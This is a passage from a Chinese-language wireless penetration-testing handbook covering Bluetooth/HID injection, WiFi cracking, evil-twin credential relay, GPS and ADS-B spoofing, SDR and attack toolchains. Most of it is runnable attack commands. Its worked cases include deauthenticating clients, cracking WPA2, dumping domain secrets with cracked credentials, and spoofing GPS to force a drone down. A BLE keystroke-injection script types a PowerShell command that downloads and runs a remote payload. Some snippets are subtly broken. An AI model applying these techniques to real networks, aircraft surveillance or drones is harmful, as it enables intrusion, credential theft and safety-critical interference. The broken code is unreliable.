# 一旦配对成功, 注入任意按键
python3 logitech_hid_inject.py -c "powershell -c IEX(...)"

# Logitech Encryption 绕过
# 某些 Logitech 设备使用 AES 加密
# 但密钥可以从固件中提取
# 或通过配对过程捕获
```

### 7.3 2.4GHz 注入

```bash
# 2.4GHz 无线注入通用方法
# 使用 nRF24L01+ 模块 + Arduino/ESP32

# 1. 扫描 2.4GHz 频谱
# 使用 HackRF 或 RTL-SDR
rtl_power -f 2400M:2480M:1M -g 20 -e 1h 2.4ghz.csv

# 2. 分析信号
# 使用 inspectrum 或 Universal Radio Hacker (URH)
inspectrum capture.cfile

# 3. 使用 URH 解码协议
# Universal Radio Hacker
# https://github.com/jopohl/urh

# 4. 使用 nRF24 嗅探特定设备
# 设置 nRF24 为接收模式
# 监听指定地址
python3 nrf24_sniff.py -a 0x123456789A

# 5. 注入自定义数据包
python3 nrf24_inject.py -a 0x123456789A -d "payload"

# Crazyradio PA 高级用法
# Crazyradio PA 是更强大的 nRF24 适配器
# 支持长距离通信
python3 << 'EOF'
import usb.core
# 使用 Crazyradio PA 库
from crazyradio import Crazyradio
cr = Crazyradio()
cr.set_channel(5)
cr.set_data_rate(cr.DR_2MPS)
# 发送数据包
cr.send_packet(data)
EOF
```

---

## 8. 2026 最新无线攻击

### 8.1 WiFi 7 (802.11be) 安全

```bash
# WiFi 7 (802.11be) 新特性
# - 320MHz 信道带宽
# - 4K QAM
# - Multi-Link Operation (MLO): 同时使用多个信道
# - Multi-RU: 多资源单元
# - Enhanced QoS

# WiFi 7 安全影响
# 1. MLO 多链路操作攻击
# 攻击者可以干扰其中一个链路
# 利用链路切换时的状态不一致
# 跨链路安全关联攻击

# 2. 320MHz 信道
# 更宽的信道意味着更多干扰可能性
# 频谱分析更复杂

# 3. 4K QAM 信号
# 需要更高 SNR, 更容易干扰
# 信号质量下降可能导致降级到更弱加密

# 4. WiFi 7 MLO 中间人攻击
# 攻击者在一个链路上做 MITM
# 另一个链路正常通信
# 利用 MLO 的链路管理缺陷

# WiFi 7 测试工具
# 需要支持 WiFi 7 的硬件 (Intel BE200, Qualcomm NCM865)
# 或使用 QCA 的 ath12k 驱动
```

### 8.2 WPA4 展望

```bash
# WPA4 预期特性 (2026-2027)
# 1. 后量子密码学 (PQC)
#    - 抗量子计算的密钥交换
#    - CRYSTALS-Kyber / CRYSTALS-Dilithium

# 2. 增强的身份保护
#    - 隐藏 SSID 和客户端身份
#    - 防止流量分析

# 3. 快速安全漫游
#    - 802.11r 改进
#    - 预认证优化

# 4. 零信任 WiFi
#    - 持续设备健康检查
#    - 动态信任评分

# WPA4 过渡期攻击
# 1. WPA3→WPA4 降级攻击
# 2. 混合模式漏洞
# 3. 后量子密码学实现缺陷
```

### 8.3 Passpoint / OpenRoaming

```bash
# Passpoint (Hotspot 2.0 / 802.11u)
# 自动发现和连接 WiFi 网络
# 使用 802.1X EAP 认证

# Passpoint 攻击
# 1. 伪造 Passpoint 网络
# 客户端自动连接
# 使用 hostapd 配置 Passpoint

# 2. ANQP 信息操纵
# 伪造 ANQP 响应
# 引导客户端连接到恶意 AP

# 3. OSU (Online Sign-Up) 钓鱼
# 伪造 OSU 服务器
# 窃取注册信息

# OpenRoaming (WBA)
# 跨运营商 WiFi 漫游
# 基于 RadSec (RADIUS over TLS)
# 攻击面: RadSec 证书验证, 漫游联盟

# 配置 hostapd Passpoint
# hs20=1
# hs20_oper_friendly_name=eng:FreeWiFi
# hs20_wan_metrics=01:8000:1000:80:0:0
# hs20_conn_capab=1:0:0,6:22:1,17:5060:0
# interworking=1
# access_network_type=0
# internet=1
# venue_group=2
# venue_type=1
```

### 8.4 蓝牙 6.0 Channel Sounding

```bash
# 蓝牙 6.0 Channel Sounding 安全
# 精确测距功能 (UWB 级别精度)
# 应用于: 数字车钥匙, 门禁, 支付

# 攻击向量
# 1. 距离欺骗
# 攻击者伪造信道探测响应
# 让设备误以为距离很近
# 实现: 快速响应的信号中继

# 2. 相位操纵攻击
# 操纵 PBR (Phase-Based Ranging) 或 RTT (Round-Trip Time)
# 注入延迟或提前响应

# 3. 侧信道攻击
# 通过信道探测信息推断设备位置
# 隐私泄露

# 4. 降级攻击
# 如果设备支持多种测距方式
# 强制降级到较弱的测距方式

# 蓝牙 6.0 测距安全测试
# 使用 SDR 平台模拟信道探测
# 需要蓝牙 6.0 硬件 (2026 年发布)
```

### 8.5 LE Audio / LC3

```bash
# LE Audio 安全
# 1. LC3 编解码器
#    - 更好的压缩效率
#    - 更低的延迟

# 2. Auracast 广播音频
#    - 一对多广播
#    - 可能被窃听

# 3. 广播音频攻击
#    - 未授权的广播接收
#    - 广播源伪造
#    - 广播加密密钥泄露

# 4. 音频流注入
#    注入恶意音频到广播流
#    影响: 助听器, 公共广播

# Auracast 安全测试
# 使用 BLE 嗅探器捕获广播音频
# 分析加密实现的漏洞
# 测试广播密钥管理
```

### 8.6 Thread / Matter 无线安全

```bash
# Thread 网络安全
# 基于 6LoWPAN + IEEE 802.15.4
# 使用 AES-CCM 加密

# Thread 攻击
# 1. 网络密钥提取
# 从设备固件中提取
# 或通过加入过程捕获

# 2. Commissioner 攻击
# 如果 Commissioner 凭据泄露
# 可以加入任何 Thread 网络

# 3. Border Router 攻击
# 攻击 Thread 边界路由器
# 获取 WiFi 和 Thread 双重访问

# Matter 安全
# 基于 IP 的智能家居协议
# 使用 DAC (Device Attestation Certificate)
# 基于区块链的分布式合规账本 (DCL)

# Matter 攻击
# 1. 配对过程攻击
# 利用 Matter 配对码 (11 位数字)
# 暴力破解配对码

# 2. DAC 证书伪造
# 如果攻击者控制了 CA
# 或利用了证书验证漏洞

# 3. 多管理员攻击
# Matter 支持多管理员
# 攻击者可以作为管理员加入
# 获取设备控制权

# 4. 固件更新攻击
# Matter OTA 更新机制
# 如果签名验证有漏洞
# 可以刷写恶意固件

# Thread/Matter 测试工具
# 使用 nRF52840 DK 或 CC2652 开发板
# 刷写 OpenThread 嗅探器固件
# 使用 Wireshark 分析 Thread 流量
```

---

## 9. 5G / 卫星 / 无人机安全

### 9.1 5G NR 信令安全

```bash
# 5G NR 安全架构
# 1. 5G-AKA (认证和密钥协商)
# 2. 5G SUPI/SUCI (用户标识隐私)
# 3. 5G 网络切片安全

# 5G 安全测试
# 使用 Open5GS + UERANSIM 搭建测试环境
# 安装 Open5GS
apt-get install open5gs
# 安装 UERANSIM (UE/RAN 模拟器)
git clone https://github.com/aligungr/UERANSIM
cd UERANSIM
make

# 配置 5G 核心网
# /etc/open5gs/amf.yaml
# /etc/open5gs/smf.yaml
# /etc/open5gs/upf.yaml

# 配置 UERANSIM
# ueransim/config/open5gs-ue.yaml
# ueransim/config/open5gs-gnb.yaml

# 启动 5G 网络
./nr-gnb -c config/open5gs-gnb.yaml
./nr-ue -c config/open5gs-ue.yaml

# 5G 信令攻击
# 1. SUPI 追踪攻击
# 即使使用 SUCI, 也可能被追踪
# 通过 IMSI 捕获器 (5G 版)
# 2. 降级攻击 (5G → 4G)
# 迫使 UE 降级到 4G, 利用 4G 安全缺陷
# 3. 网络切片 DoS
# 攻击特定网络切片的资源

# 使用 srsRAN 5G
# 开源 5G RAN 实现
git clone https://github.com/srsran/srsRAN_Project
```

### 9.2 卫星通信安全

```bash
# Iridium 卫星通信
# 1. 信号捕获
# 使用 RTL-SDR + L-band 天线
rtl_sdr -f 1626000000 -s 2000000 -g 40 iridium.cfile

# 2. 解码 Iridium 信号
# 使用 iridium-toolkit
git clone https://github.com/muccc/iridium-toolkit
cd iridium-toolkit
python3 iridium-extractor.py iridium.cfile

# 3. 解析 Iridium 数据
# 提取 LAC (Location Area Code), 短信, 寻呼

# Inmarsat 卫星通信
# 1. 捕获 Inmarsat 信号
# 使用 RTL-SDR + L-band 天线 (1.5GHz)
rtl_sdr -f 1546000000 -s 2000000 -g 40 inmarsat.cfile

# 2. 解码 ACARS/STD-C 信号
# 使用 JAERO 或 Scytale-C
# 航空 ACARS 信息
# 海事安全信息

# Starlink 安全分析
# 1. 信号分析
# 使用频谱分析仪或 SDR
# 分析 Starlink 下行链路信号

# 2. 终端硬件分析
# 拆解 Starlink 终端 (Dishy)
# 提取固件
# 分析硬件安全

# 3. 网络层分析
# 分析 Starlink 的 IP 层
# CGNAT (Carrier-Grade NAT)
# 可能的 IPv6 暴露

# 卫星通信通用攻击
# 1. 信号干扰 (Jamming)
# 2. 信号欺骗 (Spoofing)
# 3. 重放攻击
# 4. 侧信道攻击 (射频泄露)
```

### 9.3 无人机 GPS 欺骗

```bash
# GPS 欺骗攻击
# 需要: HackRF One / BladeRF + GPS 模拟软件

# 1. 使用 GPS-SDR-SIM 生成 GPS 信号
git clone https://github.com/osqzss/gps-sdr-sim
cd gps-sdr-sim
# 生成静态位置的 GPS 信号
./gps-sdr-sim -e brdc3540.14n -l 37.7749,-122.4194,100 -b 8

# 2. 发射 GPS 信号
# 使用 HackRF One
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 20

# 3. 无人机 GPS 欺骗
# 生成虚假 GPS 轨迹
# 引导无人机到指定位置
# 或使无人机进入 fail-safe 模式

# 4. 使用 BladeRF 进行 GPS 欺骗
bladeRF-cli -s script.txt

# 无人机通信劫持
# 1. 频谱分析
# 使用 RTL-SDR 或 HackRF 扫描无人机频段
# 常见频段: 2.4GHz, 5.8GHz (视频), 433MHz/915MHz (遥控)

# 2. 遥控信号分析
# 使用 Universal Radio Hacker (URH)
# 捕获并分析遥控信号
# 识别协议 (DSM, SBUS, PPM, CRSF 等)

# 3. 遥控信号重放
# 捕获合法遥控信号
# 重放以控制无人机

# 4. 视频信号拦截
# 使用模拟视频接收器 (5.8GHz)
# 或使用 OpenHD 数字视频系统

# 5. 使用 Spektrum 协议攻击
# DSM2/DSMX 协议分析
# 劫持绑定的 Spektrum 接收器
```

### 9.4 ADS-B 欺骗

```bash
# ADS-B (Automatic Dependent Surveillance-Broadcast)
# 飞机广播位置, 速度, 高度等信息
# 频率: 1090MHz
# 无加密, 无认证

# 1. 接收 ADS-B 信号
# 使用 RTL-SDR + dump1090
rtl_sdr -f 1090000000 -s 2000000 -g 40 adsb.cfile
dump1090 --interactive --net

# 2. 解码 ADS-B 数据
# 分析飞机位置, 速度, 高度
# 使用 dump1090 Web 界面
# http://localhost:8080

# 3. ADS-B 欺骗
# 生成虚假 ADS-B 信号
# 创建幽灵飞机
# 使用 HackRF One 发射

# 使用 ADS-B 欺骗工具
# 生成虚假飞机
python3 << 'EOF'
import pyModeS as pms
# 生成 ADS-B 位置消息
icao = 0xABCDEF
lat, lon = 37.7749, -122.4194
alt = 35000  # 英尺
msg = pms.adsb. airborne_position(icao, lat, lon, alt, 0)
# 发射信号
EOF

# ADS-B 欺骗防御
# 1. 多基站 TDOA 验证
# 2. 方向测量 (DF)
# 3. 加密 ADS-B (ADS-B SEC)
```

---

## 10. 软件定义无线电 SDR

### 10.1 HackRF One 基础

```bash
# HackRF One 基础操作
# 频率范围: 1MHz - 6GHz
# 带宽: 20MHz
# 半双工

# 检查设备
hackrf_info

# 接收信号
hackrf_transfer -r capture.iq -f 433920000 -s 2000000 -g 40 -l 40

# 发射信号
hackrf_transfer -t signal.iq -f 433920000 -s 2000000 -a 1 -x 20

# 频谱分析
hackrf_sweep -f 2400:2480 -w 100000 -N 1000

# 使用 HackRF 重放攻击
# 1. 捕获信号
hackrf_transfer -r capture.iq -f 433920000 -s 2000000 -g 40 -n 20000000

# 2. 重放信号
hackrf_transfer -t capture.iq -f 433920000 -s 2000000 -a 1 -x 40

# 使用 GNU Radio 配合 HackRF
# 创建流图
# 使用 osmocom Sink/Source 块
# 设置频率, 采样率, 增益
```

### 10.2 RTL-SDR 基础

```bash
# RTL-SDR 基础操作
# 频率范围: 24MHz - 1.7GHz (典型)
# 带宽: 最大 2.4MHz
# 仅接收

# 测试设备
rtl_test

# 频谱扫描
rtl_power -f 88M:108M:100k -g 20 -e 1h fm_scan.csv

# 接收 FM 广播
rtl_fm -f 98.5M -M wbfm -s 200000 -r 48000 - | aplay -r 48000 -f S16_LE

# 接收 ADS-B
rtl_sdr -f 1090000000 -s 2000000 -g 40 adsb.raw

# 接收 NOAA 气象卫星
rtl_fm -f 137.9125M -s 48000 -g 48 -p 55 -E wav -E deemp -F 9 - | sox -t raw -r 48000 -e s -b 16 -c 1 -V1 - noaa.wav

# 使用 GQRX (GUI SDR 软件)
gqrx

# 使用 rtl_433 解码 433MHz ISM 设备
rtl_433 -f 433920000 -G
# 解码温度传感器, 门磁, 遥控器等
```

### 10.3 GNU Radio 信号分析

```python
# GNU Radio Python 脚本
# 创建 FM 接收器
from gnuradio import gr, blocks, analog, audio, filter
from gnuradio.filter import firdes

class FMReceiver(gr.top_block):
    def __init__(self):
        gr.top_block.__init__(self, "FM Receiver")
        
        # 参数
        samp_rate = 2e6
        audio_rate = 48e3
        freq = 98.5e6
        
        # 块
        self.src = blocks.file_source(gr.sizeof_gr_complex, "fm_capture.iq")
        self.lpf = filter.fir_filter_ccf(1, firdes.low_pass(1, samp_rate, 100e3, 10e3))
        self.demod = analog.quadrature_demod_cf(1)
        self.resampler = filter.rational_resampler_fff(int(audio_rate), int(samp_rate))
        self.sink = audio.sink(audio_rate, "pulse")
        
        # 连接
        self.connect(self.src, self.lpf, self.demod, self.resampler, self.sink)

# 自定义 OOK 解码器
class OOKDecoder(gr.sync_block):
    def __init__(self, threshold=0.5):
        gr.sync_block.__init__(self, "OOK Decoder", 
            [gr.sizeof_float], [gr.sizeof_char])
        self.threshold = threshold
    
    def work(self, input_items, output_items):
        in0 = input_items[0]
        out = output_items[0]
        for i in range(len(in0)):
            out[i] = 1 if in0[i] > self.threshold else 0
        return len(out)
```

### 10.4 协议逆向

```bash
# 无线协议逆向工程工作流
# 1. 信号捕获
hackrf_transfer -r signal.iq -f 433920000 -s 2000000 -g 40

# 2. 信号分析
# 使用 inspectrum
inspectrum signal.iq

# 3. 解调
# 使用 URH (Universal Radio Hacker)
# 导入 IQ 文件
# 选择解调方式 (ASK/OOK, FSK, GFSK, MSK 等)
# 提取比特流

# 4. 协议分析
# 使用 URH 的分析功能
# 识别前导码, 同步字, 地址, 数据, 校验和
# 标记字段

# 5. 模糊测试
# 使用 URH 的模糊测试功能
# 修改特定字段
# 发送并观察设备响应

# 6. 使用 rtl_433 解码常见协议
# 已支持数百种协议
rtl_433 -f 433920000 -A  # 分析模式
rtl_433 -f 433920000 -R 0  # 禁用所有解码器
rtl_433 -f 433920000 -R 19  # 只使用特定解码器
```

### 10.5 自定义信号生成

```python
# 自定义信号生成
# 使用 Python + NumPy 生成 IQ 采样

import numpy as np
import matplotlib.pyplot as plt

# 生成 FSK 信号
def generate_fsk(data, bit_rate, samp_rate, f_dev, f_center):
    """生成 FSK 调制信号"""
    samples_per_bit = int(samp_rate / bit_rate)
    total_samples = len(data) * samples_per_bit
    
    t = np.arange(total_samples) / samp_rate
    signal = np.zeros(total_samples, dtype=complex)
    
    for i, bit in enumerate(data):
        start = i * samples_per_bit
        end = (i + 1) * samples_per_bit
        if bit:
            freq = f_center + f_dev
        else:
            freq = f_center - f_dev
        signal[start:end] = np.exp(2j * np.pi * freq * t[start:end])
    
    return signal

# 生成 OOK 信号
def generate_ook(data, bit_rate, samp_rate, f_center):
    """生成 OOK 调制信号"""
    samples_per_bit = int(samp_rate / bit_rate)
    total_samples = len(data) * samples_per_bit
    
    t = np.arange(total_samples) / samp_rate
    carrier = np.exp(2j * np.pi * f_center * t)
    
    # 扩展比特到采样率
    envelope = np.repeat(data, samples_per_bit)
    
    return envelope * carrier

# 生成 GFSK 信号
def generate_gfsk(data, bit_rate, samp_rate, f_dev, f_center, bt=0.5):
    """生成 GFSK 调制信号 (带高斯滤波)"""
    from scipy.signal import gaussian
    samples_per_bit = int(samp_rate / bit_rate)
    # 高斯滤波器
    sigma = np.sqrt(np.log(2)) / (2 * np.pi * bt)
    # ... FSK + 高斯滤波
    pass
```

---

## 11. 无线安全工具链

### 11.1 aircrack-ng 套件

```bash
# aircrack-ng 完整工具链
# 核心工具:
#   airmon-ng: 启用监控模式
#   airodump-ng: 包捕获
#   aireplay-ng: 包注入
#   aircrack-ng: 破解 WEP/WPA
#   airdecap-ng: 解密 WEP/WPA 包
#   airbase-ng: 创建 AP
#   airdecloak-ng: 移除 WEP 伪装
#   airdriver-ng: 驱动管理
#   airtun-ng: 虚拟隧道接口
#   packetforge-ng: 创建加密包
#   airserv-ng: 无线卡服务器

# 完整攻击流程
# 1. 启动监控
airmon-ng start wlan0

# 2. 扫描
airodump-ng mon0

# 3. 捕获
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture mon0

# 4. Deauth
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 mon0

# 5. 破解
aircrack-ng -w wordlist.txt capture-01.cap
```

### 11.2 hcxtools / hcxdumptool

```bash
# hcxtools / hcxdumptool
# 比 aircrack-ng 更现代的 WiFi 审计工具

# 1. 抓取所有可用信息
hcxdumptool -i mon0 -o capture.pcapng --enable_status=1 --enable_status=2 --enable_status=4 --enable_status=8

# 2. 提取 hash
hcxpcapngtool -o hash.hc22000 -E essidlist capture.pcapng

# 3. 提取 PMKID
hcxpcapngtool -o pmkid.16800 capture.pcapng

# 4. 使用 Hashcat 破解
hashcat -m 22000 hash.hc22000 wordlist.txt

# 5. 分析 PMKID 弱点
hcxhashtool -i hash.hc22000 --info=stdout

# 6. 过滤和排序
hcxhashtool -i hash.hc22000 -o filtered.hc22000 --essid="TargetSSID"
```

### 11.3 bettercap

```bash
# bettercap WiFi 模块
# 完整 WiFi 攻击框架

# 启动 bettercap
bettercap

# WiFi 侦察
net.recon on
wifi.recon on
wifi.show

# 创建 AP
wifi.recon off
set wifi.ap.ssid FreeWiFi
set wifi.ap.channel 6
wifi.ap on

# Deauth 攻击
wifi.deauth AA:BB:CC:DD:EE:FF

# 客户端关联
wifi.assoc all

# PMKID 攻击
wifi.assoc PMKID

# 抓包
net.sniff on

# BLE 模块
ble.recon on
ble.show

# HID 模块
hid.recon on
```

### 11.4 wifite / pyrit

```bash
# wifite - 自动化 WiFi 攻击
# 自动扫描, 捕获握手包, 破解密码
wifite
wifite --kill --dict /usr/share/wordlists/rockyou.txt
wifite -i mon0 --pmkid
wifite --wps --pixie

# pyrit - GPU 加速 WPA 破解
# 预计算 PMK 数据库
pyrit -i wordlist.txt create_essid
pyrit -i wordlist.txt passthrough
pyrit batch
pyrit -r capture-01.cap attack_db

# 使用 cowpatty 破解
# 预计算 hash 表
genpmk -f wordlist.txt -d pmk_hash.db -s TargetSSID
cowpatty -d pmk_hash.db -s TargetSSID -r capture-01.cap
```

### 11.5 BLE 工具集

```bash
# btlejack - BLE 连接劫持
btlejack -f 0x129f3244 -c any
btlejack -f 0x129f3244 -j
btlejack -f 0x129f3244 -s

# crackle - BLE 配对破解
crackle -i capture.pcap -o decrypted.pcap

# btlejuice - BLE MITM
btlejuice -u 192.168.1.100 -w
btlejuice-proxy

# bluesnarfer - 蓝牙信息窃取
bluesnarfer -r 1-10 -b AA:BB:CC:DD:EE:FF

# blueranger - 蓝牙距离探测
blueranger AA:BB:CC:DD:EE:FF

# btscanner - 蓝牙扫描
btscanner
```

---

## 12. 实战案例

### 12.1 WiFi 密码破解 → 内网渗透

```bash
# 案例: 通过 WiFi 密码破解进入内网, 横向移动至域控

# 阶段 1: 侦察
# 1.1 扫描附近的 WiFi 网络
airodump-ng mon0
# 发现目标: CorpWiFi (WPA2-PSK), 信道 6, BSSID AA:BB:CC:DD:EE:FF

# 1.2 检查连接的客户端
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF mon0
# 发现 3 个连接客户端

# 阶段 2: 捕获握手包
# 2.1 开始抓包
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w corp_capture mon0

# 2.2 发送 Deauth 获取握手包
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 mon0

# 2.3 验证握手包
aircrack-ng corp_capture-01.cap

# 阶段 3: 破解密码
# 3.1 提取 hash
hcxpcapngtool -o hash.hc22000 corp_capture-01.cap

# 3.2 使用 Hashcat 破解
hashcat -m 22000 hash.hc22000 -r /usr/share/hashcat/rules/best64.rule /usr/share/wordlists/rockyou.txt
# 密码: CorpWiFi2024!

# 阶段 4: 连接内网
# 4.1 连接 WiFi
wpa_supplicant -B -i wlan0 -c <(wpa_passphrase CorpWiFi 'CorpWiFi2024!')
dhclient wlan0

# 4.2 内网扫描
nmap -sn 192.168.1.0/24
nmap -sV -p 22,80,443,445,3389,8080 192.168.1.0/24

# 4.3 发现域控制器
# 192.168.1.10 是 DC, 开放 389, 445, 88

# 阶段 5: 内网渗透
# 5.1 使用 Responder 捕获 NetNTLM hash
responder -I wlan0 -wrf

# 5.2 枚举 AD
ldapsearch -H ldap://192.168.1.10 -x -b "DC=corp,DC=com"
# 或使用 BloodHound
bloodhound-python -d corp.com -ns 192.168.1.10 -c All

# 5.3 利用发现的漏洞
# ... 后续横向移动和提权
```

### 12.2 WPA3-Enterprise PEAP 中继 → 域凭据

```bash
# 案例: 通过 PEAP 中继攻击获取域凭据

# 阶段 1: 搭建 Evil Twin
# 1.1 配置 hostapd-wpe + PEAP 中继
cat > /etc/hostapd-wpe.conf << 'EOF'
interface=wlan0
ssid=CorpSecure
channel=6
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
eap_server=1
eap_user_file=/etc/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
radius_server=192.168.1.20
radius_server_port=1812
radius_server_secret=testing123
EOF

# 1.2 启动 Evil Twin
hostapd-wpe /etc/hostapd-wpe.conf

# 阶段 2: 等待客户端连接
# 2.1 发送 Deauth 强制客户端重连
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF mon0

# 2.2 客户端连接 Evil Twin
# 客户端尝试 PEAP 认证
# hostapd-wpe 中继到合法 RADIUS

# 阶段 3: 捕获凭据
# 3.1 hostapd-wpe 日志
# /tmp/hostapd-wpe/
# 包含:
# - EAP 类型
# - 内部认证方法
# - 用户名 (domain\username)
# - MSCHAPv2 挑战-响应
# - 如果是 PAP: 明文密码

# 3.2 破解 MSCHAPv2 响应
# 提取 challenge 和 response
# 使用 asleap 或 hashcat
asleap -C challenge_hex -R response_hex -W wordlist.txt

# 阶段 4: 使用域凭据
# 4.1 使用获得的凭据登录
# 用户名: corp\jsmith
# 密码: Summer2024!

# 4.2 域内操作
impacket-psexec corp/jsmith:'Summer2024!'@192.168.1.10
impacket-secretsdump corp/jsmith:'Summer2024!'@192.168.1.10

# 4.3 进一步横向移动
# 使用 BloodHound 找到攻击路径
# 提权到域管理员
```

### 12.3 蓝牙键盘注入 → RCE

```bash
# 案例: 通过蓝牙键盘注入实现 RCE

# 阶段 1: 侦察蓝牙键盘
# 1.1 扫描蓝牙设备
hcitool scan
# 发现: Logitech MX Keys (AA:BB:CC:DD:EE:FF)

# 1.2 枚举 GATT 服务
bleah AA:BB:CC:DD:EE:FF -e
# 发现 HID 服务 (UUID: 0x1812)
# 发现 Report 特征 (UUID: 0x2A4D)

# 阶段 2: 利用 CVE-2023-45866
# 2.1 无需配对即可连接
# 使用 Python 脚本
python3 << 'EOF'
import asyncio
from bleak import BleakClient

HID_REPORT = "00002a4d-0000-1000-8000-00805f9b34fb"

async def inject(target):
    async with BleakClient(target) as client:
        # Windows 键盘注入序列
        # Win+R → cmd → 恶意命令 → Enter
        reports = [
            bytes([0x08, 0x00, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Win+R
            await asyncio.sleep(0.5),
            bytes([0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),  # c
            bytes([0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),  # m
            bytes([0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),  # d
            bytes([0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Enter
            # ... 输入完整命令
        ]
        for report in reports:
            await client.write_gatt_char(HID_REPORT, report, response=True)
            await asyncio.sleep(0.1)

asyncio.run(inject("AA:BB:CC:DD:EE:FF"))
EOF

# 阶段 3: 命令执行
# 注入的命令:
# powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/beacon.ps1')"

# 阶段 4: 持久化
# 已获得 C2 会话
# 部署持久化机制
# 横向移动
```

### 12.4 无人机 GPS 欺骗 → 接管

```bash
# 案例: 通过 GPS 欺骗接管无人机

# 阶段 1: 侦察
# 1.1 扫描无人机通信
# 使用 RTL-SDR 和频谱分析
rtl_power -f 2400M:2480M:1M -g 20 -e 1m drone_scan.csv

# 1.2 识别遥控信号
# 2.4GHz 频段中的跳频信号
# 可能是 FrSky, FlySky, DJI 等

# 阶段 2: GPS 欺骗
# 2.1 生成 GPS 欺骗信号
# 使用 GPS-SDR-SIM
# 生成从当前位置到目标位置的轨迹
gps-sdr-sim -e brdc3540.14n -l 37.7749,-122.4194,100 -d 60 -b 8

# 2.2 发射 GPS 欺骗信号
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 40

# 阶段 3: 无人机响应
# 3.1 无人机检测到 GPS 信号变化
# GPS 模式: 尝试纠正位置
# 返航点被欺骗
# 可能触发 fail-safe 或自动降落

# 3.2 引导无人机到指定位置
# 逐步改变 GPS 位置
# 使无人机降落在攻击者指定位置

# 阶段 4: 物理接管
# 4.1 无人机降落后
# 拆解无人机
# 提取存储卡数据
# 分析固件

# 5.1 如果是 DJI 无人机
# 尝试提取飞行日志
# 使用 DJI Assistant 2
# 分析加密的飞行记录
```

---

## 附录 A: 无线频段速查表

| 技术 | 频段 | 调制方式 |
|------|------|---------|
| WiFi 2.4GHz | 2.400-2.4835 GHz | OFDM, DSSS |
| WiFi 5GHz | 5.150-5.825 GHz | OFDM |
| WiFi 6GHz | 5.925-7.125 GHz | OFDMA |
| WiFi 60GHz | 57-71 GHz | SC/OFDM |
| Bluetooth | 2.402-2.480 GHz | GFSK, DQPSK, 8DPSK |
| BLE | 2.402-2.480 GHz | GFSK |
| ZigBee | 2.405-2.480 GHz | O-QPSK |
| Z-Wave | 868.4/908.4/921.4 MHz | FSK/GFSK |
| Thread | 2.405-2.480 GHz | O-QPSK |
| LoRaWAN | 433/868/915 MHz | LoRa (CSS) |
| NFC | 13.56 MHz | ASK, BPSK |
| RFID LF | 125/134 kHz | ASK, FSK |
| RFID HF | 13.56 MHz | ASK, BPSK |
| RFID UHF | 860-960 MHz | ASK, PSK |
| GPS L1 | 1575.42 MHz | BPSK |
| ADS-B | 1090 MHz | PPM |
| 5G NR FR1 | 410-7125 MHz | OFDM |
| 5G NR FR2 | 24.25-52.6 GHz | OFDM |
| Iridium | 1616-1626.5 MHz | QPSK |
| Inmarsat | 1525-1559 MHz | QPSK |
| ISM 433 | 433.05-434.79 MHz | ASK/OOK, FSK |
| ISM 868 | 863-870 MHz | FSK, GFSK |
| ISM 915 | 902-928 MHz | FSK, GFSK, LoRa |

---

## 附录 B: 无线安全硬件推荐

| 硬件 | 用途 | 价格 |
|------|------|------|
| Alfa AWUS036ACH | WiFi 双频嗅探/注入 | $$ |
| Alfa AWUS036NHA | WiFi 2.4GHz 嗅探/注入 | $ |
| Panda PAU09 | WiFi 双频 | $ |
| HackRF One | 通用 SDR (1MHz-6GHz) | $$$ |
| RTL-SDR v3 | 入门 SDR | $ |
| LimeSDR Mini | 高级 SDR | $$$$ |
| Proxmark3 RDV4 | RFID/NFC 全能 | $$$ |
| ACR122U | NFC 读卡器 | $ |
| Crazyradio PA | nRF24 2.4GHz | $$ |
| nRF52840 DK | BLE/ZigBee/Thread | $$ |
| Ubertooth One | 蓝牙嗅探 | $$$ |
| Yard Stick One | 433/868/915MHz | $$ |
| cc2531 USB | ZigBee 嗅探 | $ |
| Atmel RZUSBSTICK | ZigBee 嗅探 | $$

---

## 附录 C: 参考资源

- Aircrack-ng 官方文档: https://www.aircrack-ng.org/
- Hashcat WiFi 破解: https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
- Bettercap 文档: https://www.bettercap.org/
- Dragonblood 论文: https://papers.mathyvanhoef.com/dragonblood.pdf
- FragAttacks: https://www.fragattacks.com/
- MouseJack: https://www.mousejack.com/
- KeySweeper (Arduino-based): https://github.com/samyk/keysweeper
- Proxmark3 论坛: https://proxmark.com/
- Universal Radio Hacker: https://github.com/jopohl/urh
- GNU Radio: https://www.gnuradio.org/
- WiFi Alliance: https://www.wi-fi.org/
- Bluetooth SIG: https://www.bluetooth.com/
- Thread Group: https://www.threadgroup.org/
- CSA-IOT (Matter): https://csa-iot.org/

---

## 2026 最新无线安全攻击技术

> 本章涵盖 2026 年最新无线安全攻击向量、新型漏洞利用技术和实战工具链。所有内容基于 2026 年已公开披露的 CVE、安全研究论文和 PoC 代码。

---

### §2026-1: 2026 WiFi 安全新突破

#### WPA3 FragAttacks 2026 新变种

```bash
# FragAttacks 2026 新变种概述
# 原始 FragAttacks (CVE-2020-24586/24587/24588/26139~26147) 影响所有 WiFi 标准
# 2026 年新发现: WPA3-SAE 环境下聚合帧注入变种

# CVE-2026-27xxx 系列: WPA3 聚合 A-MSDU 注入
# 攻击原理: 利用 WPA3 未正确处理 A-MSDU 聚合帧边界
# 在 SAE 握手完成后注入恶意 DNS 请求

# 检测目标是否受影响
# 抓取 WPA3-SAE 网络流量
